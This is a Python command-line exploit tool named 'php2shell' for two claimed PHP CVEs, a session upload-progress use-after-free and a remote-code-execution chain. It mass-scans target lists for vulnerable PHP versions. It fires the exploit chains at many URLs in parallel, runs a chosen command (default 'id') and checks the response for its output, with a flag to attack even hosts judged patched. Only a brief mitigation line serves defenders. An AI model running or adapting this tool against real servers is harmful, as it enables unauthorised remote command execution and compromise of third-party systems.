#!/usr/bin/env python3
# php2shell - 053o
# CVE-2026-109618 / CVE-2026-109619
# Author: 053o

from __future__ import annotations

import argparse
import json
import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from threading import Lock
from typing import Any

from php2shell_core import (
    CVE_IDS,
    FIX_VERSIONS,
    Target,
    build_rce619_multipart,
    fingerprint_target,
    resolve_call_addr,
    run_exploit_619,
    run_trigger_618,
)
from php2shell_exploit import run_smart_exploit_618

__author__ = "053o"
__version__ = "0.3.2"

LABEL = " / ".join(CVE_IDS)


class C:
    R = "\033[0m"
    G = "\033[92m"
    E = "\033[91m"
    Y = "\033[93m"
    B = "\033[96m"
    D = "\033[2m"


_color = False
_lock = Lock()


def _vt() -> bool:
    if sys.platform != "win32":
        return True
    try:
        import ctypes
        k = ctypes.windll.kernel32
        h = k.GetStdHandle(-11)
        m = ctypes.c_uint()
        if not k.GetConsoleMode(h, ctypes.byref(m)):
            return False
        if k.SetConsoleMode(h, m.value | 0x0004):
            return True
    except Exception:
        pass
    return False


def _init_color(no_color: bool, force: bool) -> bool:
    if os.environ.get("NO_COLOR") is not None:
        return False
    if no_color:
        return False
    if not sys.stdout.isatty():
        return False
    if force or os.environ.get("FORCE_COLOR"):
        if sys.platform == "win32":
            _vt()
        return True
    if sys.platform == "win32":
        return _vt()
    return True


def _p(s: str, c: str) -> str:
    return s if not _color else c + s + C.R


def out(s: str) -> None:
    print(s, flush=True)

def ok(s: str) -> None:
    out(_p(s, C.G))

def bad(s: str) -> None:
    out(_p(s, C.E))

def wrn(s: str) -> None:
    out(_p(s, C.Y))

def nfo(s: str) -> None:
    out(_p(s, C.B))

def dim(s: str) -> None:
    out(_p(s, C.D))


def show() -> None:
    out(_p(f"\n  php2shell {LABEL}  |  053o\n", C.B))


def _hex(s: str) -> int:
    return int(s.strip(), 0)


def _variants(spec: str) -> frozenset[str]:
    spec = (spec or "all").strip().lower()
    if spec in ("all", "smart", "default"):
        return frozenset({"stall", "micro", "inject"})
    parts = {p.strip() for p in spec.replace(",", " ").split() if p.strip()}
    allow = {"stall", "micro", "inject"}
    if parts - allow:
        raise SystemExit(f"bad variant: {parts - allow}")
    return frozenset(parts) if parts else frozenset({"stall"})


def _norm(raw: str) -> str:
    s = raw.strip()
    if not s:
        return s
    if "://" not in s:
        s = "https://" + s
    return s


def _load(path: str) -> list[str]:
    lines = Path(path).read_text(encoding="utf-8", errors="replace").splitlines()
    out_: list[str] = []
    skip = {"domain", "host", "url", "target"}
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        token = line.split(",")[0].split()[0].strip().lower()
        if token in skip:
            continue
        out_.append(_norm(line.split(",")[0].split()[0]))
    return out_


def _targets(args: argparse.Namespace) -> list[str]:
    t: list[str] = []
    if args.file:
        t.extend(_load(args.file))
    if args.url:
        t.append(_norm(args.url))
    seen: set[str] = set()
    uniq: list[str] = []
    for x in t:
        if x and x not in seen:
            seen.add(x)
            uniq.append(x)
    return uniq


def _classify(fp: dict[str, Any]) -> str:
    if not fp.get("http_status"):
        return "unreachable"
    if not fp.get("php_version"):
        return "no_php_version"
    if fp.get("php_patch_known") is False:
        return "branch_only"
    lv = fp.get("likely_vulnerable")
    if lv is True:
        return "likely_vulnerable"
    if lv is False:
        return "patched"
    return "eol_or_unknown"


def _check(url: str, timeout: float) -> dict[str, Any]:
    t = Target.from_url(url)
    fp = fingerprint_target(t, timeout=timeout)
    fp["mode"] = "check"
    fp["input"] = url
    fp["status"] = _classify(fp)
    return fp


def _row(fp: dict[str, Any], verbose: bool = False) -> None:
    st = fp.get("status", "?")
    ver = fp.get("php_version") or "?"
    host = fp.get("input") or fp.get("target", "?")
    if st == "likely_vulnerable":
        wrn(f"[{st}] {host} PHP {ver}")
    elif st == "branch_only":
        nfo(f"[{st}] {host} PHP {ver}")
    elif st == "patched":
        ok(f"[{st}] {host} PHP {ver}")
    elif st == "unreachable":
        bad(f"[{st}] {host}")
    else:
        nfo(f"[{st}] {host} PHP {ver}")
    if verbose:
        if fp.get("x_powered_by"):
            dim(f"    X-Powered-By: {fp['x_powered_by']}")
        if fp.get("server"):
            dim(f"    Server: {fp['server']}")


def _append(path: Path, row: dict[str, Any]) -> None:
    with _lock:
        with path.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(row, default=str) + "\n")


def _bulk_check(args: argparse.Namespace, targets: list[str]) -> int:
    w = max(1, args.workers)
    total = len(targets)
    rows: list[dict[str, Any]] = [None] * total  # type: ignore[list-item]
    idx = {u: i for i, u in enumerate(targets)}
    done = 0
    out_path: Path | None = None
    if args.output and total > 1:
        out_path = Path(args.output)
        out_path.write_text("", encoding="utf-8")

    compact = args.compact or total >= 25
    if not args.quiet and not args.json:
        dim(f"bulk check {total} targets / {w} workers / timeout {args.timeout}s")

    def _one(u: str) -> dict[str, Any]:
        if args.delay and w == 1:
            time.sleep(args.delay)
        try:
            return _check(u, args.timeout)
        except Exception as exc:
            return {"input": u, "mode": "check", "status": "error",
                    "error": f"{type(exc).__name__}: {exc}", "http_status": 0}

    def _rep(row: dict[str, Any], n: int) -> None:
        if out_path:
            _append(out_path, row)
        if not args.quiet and not args.json:
            with _lock:
                if compact:
                    st = row.get("status", "?")
                    ver = row.get("php_version") or "?"
                    host = row.get("input") or row.get("target", "?")
                    out(f"[{n}/{total}] [{st}] {host} PHP {ver}")
                else:
                    dim(f"[{n}/{total}]")
                    _row(row)

    if w == 1:
        for i, u in enumerate(targets):
            r = _one(u)
            rows[i] = r
            done = i + 1
            _rep(r, done)
    else:
        with ThreadPoolExecutor(max_workers=w) as pool:
            futs = {pool.submit(_one, u): u for u in targets}
            for f in as_completed(futs):
                u = futs[f]
                r = f.result()
                rows[idx[u]] = r
                done += 1
                _rep(r, done)

    rows = [r for r in rows if r is not None]
    return _final(args, rows, mode="check", skip=bool(out_path))


def _final(args: argparse.Namespace, rows: list[dict[str, Any]], *,
           mode: str, skip: bool = False) -> int:
    if args.output and not skip:
        p = Path(args.output)
        if len(rows) == 1 and not str(p).endswith(".jsonl"):
            p.write_text(json.dumps(rows[0], indent=2, default=str) + "\n", encoding="utf-8")
        else:
            with p.open("w", encoding="utf-8") as fh:
                for r in rows:
                    fh.write(json.dumps(r, default=str) + "\n")

    if args.json:
        out(json.dumps(rows[0] if len(rows) == 1 else rows, indent=2, default=str))

    if not args.quiet and not args.json and len(rows) > 1:
        c: dict[str, int] = {}
        for r in rows:
            k = r.get("status") or r.get("exploit_status") or "unknown"
            c[k] = c.get(k, 0) + 1
        nfo("summary: " + ", ".join(f"{k}={v}" for k, v in sorted(c.items())))

    code = 0
    if mode == "check":
        if any(r.get("status") == "likely_vulnerable" for r in rows):
            code = 2
        elif any(r.get("status") == "branch_only" for r in rows):
            code = max(code, 1)
        elif not rows or all(r.get("status") == "unreachable" for r in rows):
            code = 1
    else:
        if not any(r.get("success") for r in rows) and rows:
            code = 1
    return code


def _cmd_check(args: argparse.Namespace) -> int:
    t = _targets(args)
    if len(t) > 1 or args.file:
        return _bulk_check(args, t)
    if not t:
        bad("need url or -f")
        return 2

    fp = _check(t[0], args.timeout)
    if args.json:
        out(json.dumps(fp, indent=2))
        return 0 if fp.get("http_status") else 1

    _row(fp, verbose=True)
    if len(t) == 1:
        dim("fixes: " + ", ".join(f"{k}->{'.'.join(map(str, v))}" for k, v in FIX_VERSIONS.items()))
        dim("mitigation: session.upload_progress.enabled=Off")
    return 0 if fp.get("http_status") else 1


def _detail(url: str, smart: dict[str, Any], quiet: bool) -> None:
    if quiet:
        return
    best = smart.get("best") or {}
    nfo(f"-- {url} status={smart.get('exploit_status')} score={smart.get('best_score')} "
        f"path={best.get('path')} variant={best.get('variant')} http={best.get('status')}")
    if smart.get("litespeed_skipped"):
        wrn("    litespeed detected — stall/micro skipped (use --no-litespeed-skip to force)")
    if smart.get("session_fixation_hits"):
        ok(f"    session fixation x{smart['session_fixation_hits']}")
    if smart.get("crashes"):
        wrn(f"    worker crash x{smart['crashes']}")
    dim("    paths: " + ", ".join(smart.get("probe_paths") or []))


def _exploit_one(args: argparse.Namespace, url: str) -> dict[str, Any]:
    t = Target.from_url(url)
    exp = args.expect.encode() if args.expect else None
    row: dict[str, Any] = {"input": url, "target": t.base() + t.path,
                           "mode": "exploit", "success": False}
    hint = ""

    if not args.skip_fingerprint:
        fp = fingerprint_target(t, timeout=args.timeout)
        row["fingerprint"] = fp
        if fp.get("likely_vulnerable") is False and not args.force:
            row["exploit_status"] = "skipped_patched"
            row["error"] = f"php {fp.get('php_version')} patched"
            if not args.quiet:
                bad(f"{url}: {row['error']}")
            return row
        if fp.get("php_version") and not args.quiet:
            dim(f"[fp] {url} php {fp['php_version']}")
        hint = (fp.get("x_powered_by") or "") + " " + (fp.get("server") or "")

    chain = args.chain.lower()
    if chain in ("618", "109618", "trigger"):
        v = _variants(args.variant)
        extra = list(args.probe_path or [])

        if args.no_smart:
            res = run_trigger_618(t, stall=args.stall, rounds=args.rounds,
                                  timeout=args.timeout)
            armed = sum(1 for r in res if r.armed)
            crash = sum(1 for r in res if r.crashed)
            row.update(rounds=len(res), armed=armed, crashes=crash)
            if not args.quiet:
                for i, r in enumerate(res, 1):
                    nfo(f"-- {url} round {i}/{len(res)} sid={r.session_id}")
                    dim(f"    http {r.status} {r.reason} path={r.path}")
                    if r.session_fixation:
                        ok("    session fixation")
                    if r.crashed:
                        wrn("    crash signal")
            if armed:
                row["success"] = True
                row["exploit_status"] = "armed"
                return row
            if crash:
                row["exploit_status"] = "crash_signal"
                row["success"] = bool(args.force)
                return row
            if any(r.session_fixation for r in res):
                row["success"] = True
                row["exploit_status"] = "session_fixation"
                return row
            row["exploit_status"] = "inconclusive"
            return row

        smart = run_smart_exploit_618(
            t, stall=args.stall, rounds=args.rounds,
            timeout=args.timeout, variants=v, probe_paths=extra if extra else None,
            body_hint=hint, expect=exp, max_paths=args.max_paths,
            headers=hint,
            force_variants=args.no_litespeed_skip,
        )
        for k in ("success", "exploit_status", "best_score", "probe_paths",
                  "attempts", "armed", "crashes", "session_fixation_hits",
                  "litespeed", "litespeed_skipped"):
            if k in smart:
                row[k] = smart[k]
        _detail(url, smart, args.quiet)
        if row.get("success"):
            if row["exploit_status"] == "armed":
                ok(f"[hit] {url} upload_progress confirmed")
            elif row["exploit_status"] == "session_fixation":
                ok(f"[prim] {url} session fixation")
            return row
        if row.get("exploit_status") == "crash_signal" and args.force:
            row["success"] = True
            return row
        if row.get("exploit_status") == "upload_accepted" and not args.quiet:
            wrn(f"[weak] {url} multipart ok, bukan bukti UAF")
        elif not args.quiet:
            wrn(f"[?] {url} inconclusive")
        return row

    if chain in ("619", "109619", "rce"):
        call = resolve_call_addr(_hex(args.dtor) if args.dtor else None,
                                  _hex(args.call) if args.call else None)
        if call <= 0:
            row["exploit_status"] = "bad_args"
            row["error"] = "need --call or --dtor"
            if not args.quiet:
                bad(row["error"])
            return row
        if args.dry_run:
            sid = args.session_id or "dryrun619"
            p1, p2, meta = build_rce619_multipart(sid, args.command.encode(), call)
            out_path = Path(args.output or "body-109619.bin")
            out_path.write_bytes(p1 + p2)
            ok(f"wrote {out_path} {meta['total_len']}B call={meta['call_addr']}")
            row["success"] = True
            row["exploit_status"] = "dry_run"
            return row
        r = run_exploit_619(t, args.command, session_id=args.session_id,
                            stall=args.stall, call_addr=call)
        if not args.quiet:
            nfo(f"{url} sid={r.session_id} http {r.status} {r.reason}")
        hit = (exp and exp in r.body) or (
            not exp and (b"uid=" in r.body or b"JACKALPOC" in args.command.encode()
                         and b"JACKALPOC" in r.body))
        if hit:
            row["success"] = True
            row["exploit_status"] = "rce_hit"
            if not args.quiet:
                ok(f"[hit] {url} command output in body")
                dim(r.body[:400].decode("latin-1", "replace"))
            return row
        if r.crashed:
            row["exploit_status"] = "crash_signal"
            if not args.quiet:
                wrn(f"[sig] {url} empty/502/503")
            return row
        row["exploit_status"] = "failed"
        if not args.quiet:
            bad(f"[fail] {url} no command marker")
        return row

    row["exploit_status"] = "bad_chain"
    row["error"] = f"unknown chain {args.chain!r}"
    if not args.quiet:
        bad(row["error"])
    return row


def _bulk_exploit(args: argparse.Namespace, targets: list[str]) -> int:
    if args.dry_run and len(targets) > 1:
        bad("dry-run single target only")
        return 2
    w = max(1, args.workers)
    rows: list[dict[str, Any]] = []

    def _one(u: str) -> dict[str, Any]:
        if args.delay and w == 1:
            time.sleep(args.delay)
        return _exploit_one(args, u)

    if w == 1:
        for i, u in enumerate(targets):
            if not args.quiet and len(targets) > 1:
                dim(f"--- ({i+1}/{len(targets)}) {u} ---")
            rows.append(_one(u))
    else:
        with ThreadPoolExecutor(max_workers=w) as pool:
            futs = [pool.submit(_one, u) for u in targets]
            for f in as_completed(futs):
                rows.append(f.result())
    return _final(args, rows, mode="exploit")


def _cmd_exploit(args: argparse.Namespace) -> int:
    t = _targets(args)
    if args.file or len(t) > 1:
        if not t:
            bad("file empty")
            return 2
        return _bulk_exploit(args, t)
    if not t:
        bad("need url or -f")
        return 2

    row = _exploit_one(args, t[0])
    if args.output:
        Path(args.output).write_text(json.dumps(row, indent=2, default=str) + "\n",
                                     encoding="utf-8")
        if not args.quiet:
            dim(f"wrote {args.output}")
    if args.json:
        o = dict(row)
        if isinstance(o.get("attempts"), list) and len(o["attempts"]) > 20:
            o["attempts_truncated"] = o["attempts"][:20]
            o["attempts"] = f"<{len(row['attempts'])} attempts; see -o>"
        out(json.dumps(o, indent=2, default=str))
    if row.get("exploit_status") in ("skipped_patched", "bad_args"):
        return 2
    if row.get("success"):
        return 0
    if row.get("exploit_status") == "crash_signal" and args.force:
        return 0
    return 1


def main() -> int:
    ap = argparse.ArgumentParser(
        description=f"php2shell {LABEL} | 053o",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  python poc.py check https://target.com/index.php
  python poc.py check -f targets.txt -o out.jsonl --workers 16
  python poc.py exploit https://target.com/
  python poc.py exploit https://target.com/ --no-litespeed-skip
  python poc.py exploit -f targets.txt --chain 618 --workers 2 --delay 0.5
""",
    )
    ap.add_argument("mode", choices=("check", "exploit"), nargs="?", default="exploit")
    ap.add_argument("url", nargs="?", default=None, help="target url")
    ap.add_argument("-f", "--file", help="target list")
    ap.add_argument("--workers", type=int, default=8)
    ap.add_argument("--delay", type=float, default=0.0)
    ap.add_argument("--chain", default="618", help="618 | 619")
    ap.add_argument("--no-smart", action="store_true")
    ap.add_argument("--variant", default="all")
    ap.add_argument("--probe-path", action="append", default=None)
    ap.add_argument("--max-paths", type=int, default=4)
    ap.add_argument("--stall", type=float, default=1.5)
    ap.add_argument("--rounds", type=int, default=1)
    ap.add_argument("--command", default="id")
    ap.add_argument("--call", default="")
    ap.add_argument("--dtor", default="")
    ap.add_argument("--session-id", default=None)
    ap.add_argument("--expect", default="")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--skip-fingerprint", action="store_true")
    ap.add_argument("--force", action="store_true")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--no-litespeed-skip", action="store_true",
                    help="paksa jalanin stall & micro meskipun target LiteSpeed")
    ap.add_argument("-o", "--output", default=None)
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--no-color", action="store_true")
    ap.add_argument("--color", action="store_true")
    ap.add_argument("--compact", action="store_true")
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args()

    global _color
    _color = _init_color(args.no_color, args.color)

    show()
    if args.mode == "check":
        return _cmd_check(args)
    if not args.url and not args.file:
        bad("need url or -f")
        return 2
    return _cmd_exploit(args)


if __name__ == "__main__":
    sys.exit(main())